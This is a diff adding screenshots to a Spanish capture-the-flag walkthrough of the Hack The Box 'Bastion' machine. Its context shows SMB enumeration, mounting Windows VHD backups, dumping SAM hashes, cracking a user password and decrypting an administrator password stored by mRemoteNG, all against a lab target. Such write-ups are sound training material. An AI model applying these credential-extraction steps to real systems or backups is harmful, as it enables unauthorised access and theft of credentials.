@@ -59,6 +59,7 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
 ```
+![](/Images/bastion1.png)<br>
 
 Una vez identificados los puertos abiertos, lanzamos un segundo escaneo para detectar **versiones de servicios y ejecutar scripts de detección**:
 
@@ -105,6 +106,8 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds
 ```
 
+![](/Images/bastion2.png)<br>
+
 De este escaneo extraemos información muy valiosa:
 
 - **Sistema operativo:** Windows Server 2016 Standard (build 14393)
@@ -144,6 +147,8 @@ do_connect: Connection to 10.129.136.29 failed (Error NT_STATUS_RESOURCE_NAME_NO
 Failed to connect with SMB1 -- no workgroup available
 ```
 
+![](/Images/bastion3.png)<br>
+
 Vemos cuatro recursos compartidos. Los más interesantes son:
 - **`Backups`** → Un recurso no estándar, probablemente con contenido jugoso
 - **`ADMIN$`** y **`C$`** → Solo accesibles para administradores
@@ -174,6 +179,8 @@ smb: \> ls
                 7735807 blocks of size 4096. 2786156 blocks available
 ```
 
+![](/Images/bastion4.png)<br>
+
 Encontramos dos archivos y un directorio. El directorio `WindowsImageBackup` es especialmente interesante — es el nombre estándar que usa la herramienta de copia de seguridad integrada de Windows.
 
 Primero revisamos `note.txt`:
@@ -181,6 +188,8 @@ Primero revisamos `note.txt`:
 ```
 Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
 ```
+
+![](/Images/bastion5.png)<br>
 
 La nota dice que no copiemos el archivo de backup localmente porque el VPN es lento. Eso nos da una pista importante: **en lugar de descargar los archivos, vamos a montar el recurso compartido directamente en nuestro sistema de archivos**. Así accedemos a los datos sin necesidad de transferirlos.
 
@@ -200,6 +209,8 @@ mount -t cifs //10.129.136.29/backups /mnt -o user=,password=
 ls /mnt/
 note.txt  SDT65CB.tmp  WindowsImageBackup
 ```
+
+![](/Images/bastion6.png)<br>
 
 Ahora listamos todos los archivos recursivamente para ver qué hay dentro:
 
@@ -232,6 +243,8 @@ find /mnt/ -type f
 Lo más importante son los dos archivos `.vhd`:
 - `9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd`
 - `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd`
+
+![](/Images/bastion7.png)<br>
 
 > 💡 **¿Qué es un VHD?**  
 > Un **VHD (Virtual Hard Disk)** es un formato de archivo que representa un disco duro completo de forma virtual. Se usa principalmente en máquinas virtuales (Hyper-V, VirtualBox) y en las copias de seguridad de Windows. Contiene exactamente lo mismo que un disco físico: sistema de archivos, particiones, archivos del sistema, etc. En este caso, es una copia de seguridad del PC del usuario `L4mpje`.
@@ -269,6 +282,8 @@ guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b
 guestmount: no operating system was found on this disk
 ```
 
+![](/Images/bastion8.png)<br>
+
 El primer VHD falla porque no contiene un sistema operativo. En los backups de Windows creados con la herramienta nativa, habitualmente el primer VHD es la partición de sistema reservada (System Reserved), que contiene el bootloader pero no los archivos del sistema completos.
 
 ### ✅ Éxito con el segundo VHD
@@ -283,6 +298,8 @@ ls /mnt2/
 ```
 '$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows
 ```
+
+![](/Images/bastion9.png)<br>
 
 ¡Perfecto! El segundo VHD contiene la partición principal de Windows con todo el sistema de archivos. Tenemos acceso completo como si fuera un disco duro físico extraído del equipo.
 
@@ -333,6 +350,8 @@ dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
 [*] Cleaning up...
 ```
 
+![](/Images/bastion10.png)<br>
+
 > 💡 **Formato de los hashes en el SAM:**  
 > El formato es `usuario:RID:LM_hash:NT_hash`. El campo `aad3b435b51404eeaad3b435b51404ee` que aparece en el LM hash es el hash vacío de LM (indica que LM está desactivado, lo cual es lo normal en sistemas modernos). El hash que nos interesa crackear es el **NT hash** (el cuarto campo).
 >
@@ -348,6 +367,7 @@ Enviamos el hash NT de `L4mpje` a **CrackStation** (https://crackstation.net), u
 ```
 26112010952d963c8dc4217daec986d9 → bureaulampje
 ```
+![](/Images/bastion11.png)<br>
 
 La contraseña crackeada coincide con la contraseña de autologon que ya encontramos. Esto confirma que el usuario `L4mpje` usa la contraseña `bureaulampje`.
 
@@ -371,12 +391,16 @@ Microsoft Windows [Version 10.0.14393]
 l4mpje@BASTION C:\Users\L4mpje>
 ```
 
+![](/Images/bastion12.png)<br>
+
 Obtenemos la flag de usuario:
 
 ```
 l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
 9bfe57d5...
 ```
+
+![](/Images/bastion13.png)<br>
 
 ✅ **¡Flag de usuario conseguida!**
 
@@ -413,6 +437,8 @@ d-----        16-7-2016     15:23                WindowsPowerShell
 
 **`mRemoteNG`** salta a la vista inmediatamente.
 
+![](/Images/bastion14.png)<br>
+
 > 💡 **¿Qué es mRemoteNG?**  
 > mRemoteNG (multi-Remote Next Generation) es una herramienta de gestión de conexiones remotas de código abierto para Windows muy popular entre administradores de sistemas. Permite gestionar conexiones RDP, SSH, VNC, Telnet y otros protocolos desde una sola interfaz. Una de sus funcionalidades es guardar las contraseñas de las conexiones de forma cifrada en un archivo XML de configuración. Si conseguimos descifrar esas contraseñas, podríamos obtener credenciales de otros sistemas — o en este caso, del propio administrador de la máquina.
 
@@ -448,6 +474,8 @@ l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir
                3 Dir(s)  11.383.193.600 bytes free
 ```
 
+![](/Images/bastion15.png)<br>
+
 Encontramos el archivo `confCons.xml` (el archivo de configuración principal) y varios backups automáticos del mismo. Al examinar su contenido vemos que es un XML con las contraseñas cifradas:
 
 ```xml
@@ -457,6 +485,8 @@ Encontramos el archivo `confCons.xml` (el archivo de configuración principal) y
     <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" [...] />
 </mrng:Connections>
 ```
+
+![](/Images/bastion16.png)<br>
 
 > 💡 **Análisis del archivo de configuración:**  
 > Identificamos dos nodos (conexiones guardadas):
@@ -496,6 +526,8 @@ User Input: V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+
 Use default password for cracking...
 Decrypted Output: thXLHM96BeKL0ER2
 ```
+
+![](/Images/bastion17.png)<br>
 
 Resultados:
 - **L4mpje** → `bureaulampje` (contraseña que ya conocíamos ✓)
@@ -597,6 +629,8 @@ Obtenemos la flag de root:
 administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
 958850b9...
 ```
+
+![](/Images/bastion18.png)<br>
 
 ✅ **¡Flag de root conseguida!**
 
